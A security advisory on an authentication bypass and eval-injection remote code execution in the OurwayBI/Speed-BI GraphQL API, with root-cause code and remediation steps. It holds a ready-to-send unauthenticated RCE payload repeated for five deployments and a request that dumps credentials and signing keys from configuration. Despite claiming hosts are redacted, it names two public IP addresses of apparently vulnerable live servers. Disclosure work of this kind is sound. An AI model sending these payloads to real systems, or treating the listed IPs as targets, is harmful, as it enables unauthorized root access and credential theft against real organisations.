# OurwayBI / Speed-BI — GraphQL Global Authentication Bypass Leading to RCE

| Item | Value |
|---|---|
| Product | OurwayBI / Speed-BI |
| Vendor | Zhuhai Ourway Software Technology Co., Ltd. |
| Affected component | Cross_SBI_API (Node.js GraphQL backend, port 4367, proxied at `/api/graphql`) |
| Affected version | 8.10.89 (verified); 8.11.101 (source analysis) |
| Vulnerability type | Authentication bypass + remote code execution |
| Authentication required | None |
| CWE | CWE-95 Eval Injection; CWE-306 Missing Authentication for Critical Function |
| CVSS 3.1 | 9.8 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |

## Description

OurwayBI (also marketed as Speed-BI) is a commercial business-intelligence
platform by Zhuhai Ourway Software Technology, providing report design, data
visualisation, self-service analytics, data entry and multi-datasource
integration. Its Node.js component Cross_SBI_API exposes GraphQL operations
under `/api/graphql`. **The product is closed source**; the code discussed here
was recovered from the server-side JavaScript bundle shipped with the product
and cross-checked against the error messages and stack traces returned by live
instances.

The GraphQL entry point treats "does the raw request text contain the name of a
login-free function" as its only authentication decision. It splits the raw
query on `(` and compares the fragments against 37 allowlisted function names
by substring containment. A hit marks the request as a login-free endpoint, and
the **entire request** executes with an empty `ftoken`. Only when nothing
matches and no token is present does the server answer `token无效`.

Because the check looks at raw text rather than the parsed GraphQL document,
the allowlisted name may appear in a field alias, in a string argument, or in
an unused selection, and one hit authorises every field in the request. An
attacker can therefore call all 253 queries and 309 mutations of the schema
without credentials.

Several of those fields (`getConnList`, `getSQL`, `getReviewObjs`) pass
client-controlled strings to `toEvalBI()`, which evaluates them with
`eval("(" + input + ")")`. Breaking out of the wrapping parentheses yields
arbitrary JavaScript; a thrown error carries the command output back in the
GraphQL `errors` field, so no out-of-band channel is needed. On the Linux
instances tested, commands executed as **root**. The issue reproduced on five
internet-facing deployments.

## 0. Affected deployments (five samples)

All screenshots below show the output of `id` (or `whoami` on Windows)
executed through the vulnerable endpoint. Hostnames are shown as they appear in
the internal report; they are replaced with placeholders in public copies.

### 1. xmjl.<redacted>:8080

```http
POST /api/graphql HTTP/1.1
Host: <target>:8080
Content-Type: application/json
Connection: close

{"query":"{fbrowser: __typename loginVerifyToken: __typename getConnList(fconnids:\"1)+(function(){throw new Error(require('child_process').execSync('id').toString())})()+(1\",fgroupid:\"\",cloudtoken:\"\")}","ftoken":"","ftokenswarm":""}
```

<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/63fbf3f4-e37b-47d9-8bcc-4a9ad3f65602" />


### 2. 220.160.117.106:88

```http
POST /api/graphql HTTP/1.1
Host: <target>:88
Content-Type: application/json
Connection: close

{"query":"{fbrowser: __typename loginVerifyToken: __typename getConnList(fconnids:\"1)+(function(){throw new Error(require('child_process').execSync('id').toString())})()+(1\",fgroupid:\"\",cloudtoken:\"\")}","ftoken":"","ftokenswarm":""}
```

<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/632653cb-e132-4e89-a9df-bacf1a7a8e14" />


### 3. jsjxzjps.<redacted>:8080

```http
POST /api/graphql HTTP/1.1
Host: <target>:8080
Content-Type: application/json
Connection: close

{"query":"{fbrowser: __typename loginVerifyToken: __typename getConnList(fconnids:\"1)+(function(){throw new Error(require('child_process').execSync('id').toString())})()+(1\",fgroupid:\"\",cloudtoken:\"\")}","ftoken":"","ftokenswarm":""}
```

<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/ebc840e3-20d4-4ed7-83ce-12762d932a3c" />



### 4. db.<redacted>:445 (HTTPS enforced)

```http
POST /api/graphql HTTP/1.1
Host: <target>
Content-Type: application/json
Connection: close

{"query":"{fbrowser: __typename loginVerifyToken: __typename getConnList(fconnids:\"1)+(function(){throw new Error(require('child_process').execSync('id').toString())})()+(1\",fgroupid:\"\",cloudtoken:\"\")}","ftoken":"","ftokenswarm":""}
```

<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/fc97e299-248b-4953-9ab9-a86ef90d2320" />


### 5. 115.231.6.118:897 (Windows)

Windows has no `id`, so `whoami` is used:

```http
POST /api/graphql HTTP/1.1
Host: <target>:897
Content-Type: application/json
Connection: close

{"query":"{fbrowser: __typename loginVerifyToken: __typename getConnList(fconnids:\"1)+(function(){throw new Error(require('child_process').execSync('whoami').toString())})()+(1\",fgroupid:\"\",cloudtoken:\"\")}","ftoken":"","ftokenswarm":""}
```

<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/fec8c18e-ee66-47b0-898a-5518ee246c72" />


## 1. Root cause

### 1.1 Basis of the analysis

Because the product is closed source, the code below comes from two sources
that corroborate each other:

1. **The server-side bundle shipped with the product.** Cross_SBI_API is
   distributed as a webpack/babel artifact (`build_api/server.js` is 26,693
   bytes in two lines); formatting and deobfuscation restores the logic.
2. **Runtime feedback from live instances.** The product discloses its build
   identifier and source paths in error messages:

```
类型:Cross_SBI_API,版本:8.10.89-master_back/8.10/sonar/20220905/180542
    at eval (eval at toEvalBI (.../src/schema/resolver/Sharejs.js:151:16), <anonymous>:1:23)
    at _callee34$ (.../src/schema/resolver/Template/Template.js:1098:22)
```

The stack frames match the recovered code line for line. Line numbers refer to
a formatted copy of the bundle; in the original archive the same statements are
located by function name.

### 1.2 The authentication gate as implemented

`/api/graphql` is handled by a single express-graphql callback
(`server.pretty.js:398`). The whole request lifecycle contains exactly one
identity decision.

First, a helper decides whether the request counts as a login-free endpoint:

```js
var getOtherApi = function (query, apiName) {
  var otherapi = false;
  if (query == null) query = "";
  var querys = query.split("(");                                  // raw text
  if (query != "" && (querys.length <= 20 || query.indexOf("fbrowser") >= 0)) {
    for (var i = 0; i <= querys.length - 1; i++) {
      if (otherapi) break;
      for (var i1 = 0; i1 <= apiName.length - 1; i1++) {
        if (querys[i].indexOf(apiName[i1]) >= 0) {                // substring hit
          otherapi = true; break;
        }
      }
    }
  }
  return otherapi;
};
```

Then the gate itself (`server.pretty.js:536-563`):

```js
var otherapi = getOtherApi(query, othernames);
if (otherapi != true) otherapi = getOtherApi(query2, othernames);

if (otherapi) {                                     // whitelist hit
    if (ftoken != null && ftoken != "")
        return verifyToken(null, {token: ftoken, ...})
               .then(function (op) { return returnGraph(op) })
               .catch(function (ex) { return returnGraph() });   // still executes
    else
        return returnGraph();                       // no token -> executes
} else if (ftoken == null || ftoken == "") {
    res.send("token无效");                           // the only rejection
}
```

The allowlist holds 37 entries. Besides login functions (`loginValidPsw`,
`loginVerifyToken`, `loginGetToken`), it contains functions that operate
directly on the backend: `TestConnection`, `GetDataBase`, `RedisUtilsGet`,
`RedisUtilsSet`, `getConfigByCrossSBI`. If `multiplatform.qq.dataappid` is
configured, `userAdd`, `userValid` and `userUpdateUsersPsw` are appended at
startup — on such deployments creating users and changing passwords is
login-free by design.

The check operates on the **whole GraphQL text as a substring**: any fragment
before a `(` that contains an allowlisted name marks the **entire request** as
login-free.

Allowlist:


<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/37b3ae4f-565f-424a-9678-f56852540787" />


The entry used in this report:


<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/9644b1b0-ab30-40c1-9a28-b5f444bc3921" />


It lets an unauthenticated request through:


<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/c460d371-fc44-4be2-b6a4-24daae8f3ab0" />


`getConnList` then hands the argument to `eval()`:


<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/b241e871-ec8a-4c4c-8752-f063e694eaaf" />


### 1.3 Why the substring check is always bypassable

The check has three independent weaknesses; each alone is sufficient:

1. **Wrong object.** It inspects unparsed text, not the GraphQL document.
   `别名: 字段` is valid GraphQL syntax, so `loginVerifyToken: __typename` is
   merely a field named `__typename` aliased as `loginVerifyToken`; the
   allowlisted resolver is never called, yet its name now appears in the text.
   Putting the name inside any string argument
   (`fdate_where:["loginVerifyToken"]`) works just as well.
2. **Wrong granularity.** One hit authorises the **whole request**, so any
   field can be appended to an allowlisted one, including `userAdd`,
   `designExeSql` and `getConnList`.
3. **An "or" gate.** `querys.length <= 20 || query.indexOf("fbrowser") >= 0`
   is meant to limit long queries, but any occurrence of `fbrowser` disables
   the limit — and `fbrowser` is itself a usable alias, so satisfying it costs
   nothing.

### 1.4 Second bypass: a failed token still executes

Even with an **invalid** token the request executes:

```js
verifyToken(null, {token: ftoken, ...})
  .then(function (op) { return returnGraph(op) })
  .catch(function (ex) { return returnGraph() });   // no res.send() here
```

The catch branch does not reject; it continues with an empty identity
(`op` is `undefined`). This is a separate path from "no token at all", so
patching only the empty-token branch still leaves the endpoint open to any
random string.

### 1.5 Another downgrade: forgid_top injects admin

Inside `returnGraph` (`server.pretty.js:485-498`), when `op` is empty and
`forgid_top` is configured, the code builds:

```js
{forgid_top: <config>, forgid: "", fusername: "admin", fprojid: "1"}
```

An unauthenticated request is thus given the **admin username** before the
resolver runs. This explains why on the same instance some fields return
`Undefined binding(s) ... "forgid_top" = ?` while others return data:
whether a tenant identity is required depends on whether the resolver reads
`op.forgid_top`.

### 1.6 From bypass to code execution

After the gate opens, resolver arguments still come from the request body. The
shared helper that "parses a stringified JSON value" is `toEvalBI()`
(`Sharejs.js:138-157`):

```js
var toEvalBI = function (fstr) {
    ...
    result = decodeURIComponent(fstr);
    ...
    var ev = eval("(" + result + ")");      // line 151
    return ev
};
```

Any field declared as `String` and forwarded to this helper becomes a code
execution primitive. Three are confirmed:

| Field | Argument | Call site |
|---|---|---|
| `getConnList` | `fconnids` | `schema/resolver/Template/Template.js:1098` |
| `getSQL` | `_abs` | `schema/resolver/Design/DataSet.js:485` |
| `getReviewObjs` | `fmore_where` | `schema/resolver/Design/Reported.js:1590` |

The payload is built around the parentheses that `eval` adds:

```js
eval("(" + input + ")")
input  = 1)+(function(){throw new Error(require('child_process').execSync('id').toString())})()+(1
result = (1)+(function(){...})()+(1)
```

- `1)+` closes the parenthesis that `eval` prepends
- `})()` must include the call parentheses, otherwise the function is only
  defined and the resolver silently returns an empty array
- `+(1` balances the remaining parenthesis

Command output is visible because `throw new Error(output)` propagates to
express-graphql, which copies the message into `errors[0].message` — no
out-of-band channel is required.

## 2. Reproduction

### 2.1 Control

```http
POST /api/graphql HTTP/1.1
Host: <target>:8080
Content-Type: application/json

{"query":"{getReviewObjs(frptid:\"1\",fusername:\"admin\",fstate:5,fdefsql:\"\",fdate_where:[\"2020-01-01\",\"2020-01-02\"],fissubmit:1,fmore_where:\"\",pageSize:5,fisSingleBatch:true)}"}
```

Response:


<img width="2508" height="897" alt="image" src="https://github.com/user-attachments/assets/753eec63-fdef-46b0-b7c3-c3176f8a7b89" />


### 2.2 Bypass (allowlisted name added to the prefix)

```http
POST /api/graphql HTTP/1.1
Host: <target>:8080
Content-Type: application/json

{"query":"{loginVerifyToken getReviewObjs(frptid:\"1\",fusername:\"admin\",fstate:5,fdefsql:\"\",fdate_where:[\"2020-01-01\",\"2020-01-02\"],fissubmit:1,fmore_where:\"\",pageSize:5,fisSingleBatch:true)}"}
```

The resolver now executes and reaches the business stack:


<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/606f9472-6018-40f6-8ee5-4dbdb3bb1295" />


### 2.3 Unauthenticated code execution

```http
POST /api/graphql HTTP/1.1
Host: <target>:8080
Content-Type: application/json
Connection: close

{"query":"{fbrowser: __typename loginVerifyToken: __typename getConnList(fconnids:\"1)+(function(){throw new Error(require('child_process').execSync('id').toString())})()+(1\",fgroupid:\"\",cloudtoken:\"\")}","ftoken":"","ftokenswarm":""}
```


<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/5dda56d5-ee9b-404a-9b39-fcd0574201ff" />


### 2.4 Unauthenticated configuration disclosure

```http
POST /api/graphql HTTP/1.1
Host: <target>:8080
Content-Type: application/json

{"query":"{fbrowser: __typename loginVerifyToken: __typename getConfig{fkey fvalue fencrypt fcrossname}}"}
```


<img width="2559" height="1526" alt="image" src="https://github.com/user-attachments/assets/40454380-0329-42d6-9b7e-fa0abf71e70b" />


The response contains 93 configuration rows, including SMTP credentials, the
single-sign-on key, the token key and internal topology.

## 3. Remediation

1. Abandon the substring allowlist: parse the GraphQL document and match
   `OperationDefinition` / root field names exactly. Never inspect argument
   values, aliases or raw text.
2. Separate login-free operations into a dedicated endpoint
   (for example `/graphql/login`) instead of sharing one dispatcher.
3. Remove the fallback that synthesises `fusername:"admin"` when
   `forgid_top` is configured; reject requests without an identity.
4. Reject a request whose token fails verification — the `.catch` branch must
   not continue with an empty identity.
5. Require administrator privileges for `getConfig`; fields marked
   `fencrypt=true` must actually be encrypted at rest and never returned in
   plaintext.
6. Disable introspection and GraphiQL in production; stop returning version
   numbers and source paths in error messages.
7. Remove `designExeSql`, `getSQLPageData`, `RedisUtilsSet` and similar
   capabilities from the external GraphQL surface, or restrict them to an
   explicit datasource allowlist with full auditing.

## 4. Legal

All testing was performed against systems the reporter is authorised to
assess. Hostnames of third-party deployments have been replaced with
placeholders in this English version; the original Chinese report retains
them for internal disclosure.
